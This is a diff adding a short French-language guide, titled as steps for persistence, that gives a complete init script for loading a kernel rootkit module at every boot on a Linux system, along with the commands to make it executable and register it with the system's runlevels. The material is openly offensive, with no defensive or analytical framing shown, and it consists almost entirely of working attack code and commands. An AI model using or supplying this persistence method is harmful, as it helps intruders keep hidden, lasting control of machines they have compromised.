@@ -1,0 +1,52 @@
+
+
+Étapes pour la Persistance
+
+
+
+
+Script d'Initialisation
+
+Crée un fichier de script dans /etc/init.d/ pour charger le module rootkit au démarrage :
+
+/etc/init.d/load_rootkit
+sh
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          load_rootkit
+# Required-Start:    $all
+# Required-Stop:
+# Default-Start:     2 3 4 5
+# Default-Stop:
+# Short-Description: Load rootkit module at startup
+### END INIT INFO
+
+case "$1" in
+  start)
+    insmod /path/to/your/rootkit.ko
+    ;;
+  stop)
+    rmmod rootkit
+    ;;
+  *)
+    echo "Usage: /etc/init.d/load_rootkit {start|stop}"
+    exit 1
+    ;;
+esac
+
+exit 0
+
+
+ --> Commandes pour Activer le Script <--
+
+Rendre le script exécutable :
+sudo chmod +x /etc/init.d/load_rootkit
+
+
+
+Ajouter le script aux niveaux d'exécution :
+
+sudo update-rc.d load_rootkit defaults
+
+
+
